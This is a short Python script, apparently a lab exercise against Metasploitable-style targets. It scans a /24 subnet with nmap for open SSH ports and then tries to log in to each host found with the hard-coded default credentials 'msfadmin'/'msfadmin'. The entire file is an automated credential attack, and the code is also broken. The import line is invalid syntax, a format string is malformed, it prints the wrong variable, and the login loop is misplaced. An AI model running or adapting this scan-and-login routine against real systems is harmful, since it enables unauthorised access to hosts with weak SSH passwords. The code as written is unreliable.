from "python-map" import nmap
import paramiko

print("Let's start to scan through NMAP")

scan = nmap.PortScanner()
results = scan.scan("172.30.177.94/24")

ips = []
hosts = []
for ip in results["scan"]:
    ips.append(ip)

for host in ips:
    try:
        result = scan.scan(host, "22")
        if result["scan"][host]["tcp"][22]["state"] == "open":
            product = result["scan"][host]["tcp"][22]["product"]
            version = result["scan"][host]["tcp"][22]["version"]
            info = result["scan"][host]["tcp"][22]["extrainfo"]
            message = result["scan"][host]["tcp"][22]["extrainfo"]
            print(message)
            hosts.append(host)
    except:
        pass

    for host in hosts:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            username = "msfadmin"
            password = "msfadmin"
            ssh.connect(host, username=username, password=password)
            print("[+] IP: {0} -username: {1 - password: {2}".format(hosts, username, password))
        except paramiko.ssh_exception.AuthenticationException:
            pass

